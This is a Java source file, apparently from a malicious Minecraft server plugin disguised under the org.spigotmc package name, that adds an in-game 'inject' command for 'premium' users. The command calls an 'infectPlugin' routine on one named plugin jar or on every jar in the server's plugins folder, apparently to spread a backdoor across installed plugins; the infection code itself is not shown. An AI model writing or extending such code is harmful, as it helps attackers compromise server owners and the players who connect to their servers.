package org.spigotmc.commands.impl.premium.server;

import java.io.File;
import org.bukkit.entity.Player;
import org.spigotmc.Main;
import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;
import org.spigotmc.enums.PlayerType;
import org.spigotmc.methods.Inject;
import org.spigotmc.utils.PluginUtils;
import org.spigotmc.utils.Settings;

@CommandInfo(
    name = "inject",
    usage = "inject <plugin> | inject *",
    desc = "Injects a plugin",
    rank = PlayerType.PREMIUM,
    blatant = false
)
public class inject extends CommandListener {

    @Override
    public void execute(Main plugin, Player p, String[] args) {
        if (args.length <= 1) {
            p.sendMessage(Settings.USAGE(Inject.class.getAnnotation(CommandInfo.class).usage()));
        } else {
            String pluginName = args[1];
            if (pluginName.equals("*")) {
                p.sendMessage(Settings.PREFIX("Attempting to inject all plugins.."));
                File pluginsFolder = new File("plugins");
                File[] pluginFiles = pluginsFolder.listFiles();
                if (pluginFiles != null) {
                    for (File pluginFile : pluginFiles) {
                        if (pluginFile.isFile() && pluginFile.getName().endsWith(".jar")) {
                            try {
                                Inject.infectPlugin(pluginFile);
                                p.sendMessage(Settings.PREFIX("Plugin injected: " + pluginFile.getName()));
                            } catch (Exception e) {
                                p.sendMessage(Settings.PREFIX("Failed to inject plugin: " + pluginFile.getName()));
                            }
                        }
                    }
                    p.sendMessage(Settings.PREFIX("All plugins have been injected!"));
                }
            } else {
                if (PluginUtils.getPluginByName(pluginName) != null) {
                    p.sendMessage(Settings.PREFIX("Attempting to inject plugin: " + pluginName));
                    File pluginFile = new File(PluginUtils.getPluginByName(pluginName).getDataFolder() + ".jar");
                    try {
                        Inject.infectPlugin(pluginFile);
                        p.sendMessage(Settings.PREFIX("Plugin injected successfully: " + pluginName));
                    } catch (Exception e) {
                        p.sendMessage(Settings.PREFIX("Failed to inject plugin: " + pluginName + e));
                    }
                } else {
                    p.sendMessage(Settings.PREFIX("Plugin not found: " + pluginName));
                }
            }
        }
    }
}
